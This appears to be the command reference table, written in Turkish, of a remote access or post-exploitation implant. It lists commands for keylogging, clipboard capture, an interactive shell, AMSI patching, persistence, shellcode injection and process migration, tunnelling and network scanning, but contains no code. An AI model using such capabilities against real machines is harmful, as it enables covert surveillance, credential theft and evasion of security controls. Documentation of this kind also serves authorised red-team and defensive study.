| `keylogger_start`                   | Keylogger başlat                | Windows  |
| `keylogger_stop`                    | Keylogger durdur                | Windows  |
| `keylogger_dump`                    | Tuş kayıtlarını al              | Windows  |
| `clipboard_get`                     | Pano içeriğini oku              | Tümü     |
| `clipboard_set <metin>`             | Pano içeriğini yaz              | Tümü     |
| `shell`                             | İnteraktif shell başlat         | Tümü     |
| `loadmodule <dosya>`                | Modülü RAM'e yükle              | Tümü     |
| `listmodules`                       | Yüklü modülleri listele         | Tümü     |
| `runmodule <isim>`                  | Modülü çalıştır                 | Tümü     |
| `amsi_bypass`                       | AMSI'yi patchle                 | Windows  |
| `persistence_install`               | Kalıcılık kur                   | Tümü     |
| `persistence_remove`                | Kalıcılığı kaldır               | Tümü     |
| `inject_list`                       | Enjeksiyon hedeflerini listele  | Windows  |
| `inject_shellcode <PID> <dosya>`    | Shellcode enjekte et            | Windows  |
| `inject_shellcode_nt <PID> <dosya>` | NtCreateThreadEx ile enjeksiyon | Windows  |
| `inject_migrate <PID> [dosya]`      | Sürece migrate et               | Windows  |
| `portfwd add <LP> <RH> <RP>`        | Tünel başlat                    | Tümü     |
| `portfwd list`                      | Tünelleri listele               | Tümü     |
| `portfwd del <ID>`                  | Tüneli kaldır                   | Tümü     |
| `portfwd stop`                      | Tüm tünelleri durdur            | Tümü     |
| `netscan sweep <CIDR>`              | Ping sweep                      | Tümü     |
| `netscan arp [CIDR]`                | ARP tablosu taraması            | Tümü     |
| `netscan ports <host> [aralık]`     | TCP port taraması               | Tümü     |
| `help` / `?`                        | Yardım menüsünü göster          | Tümü     |
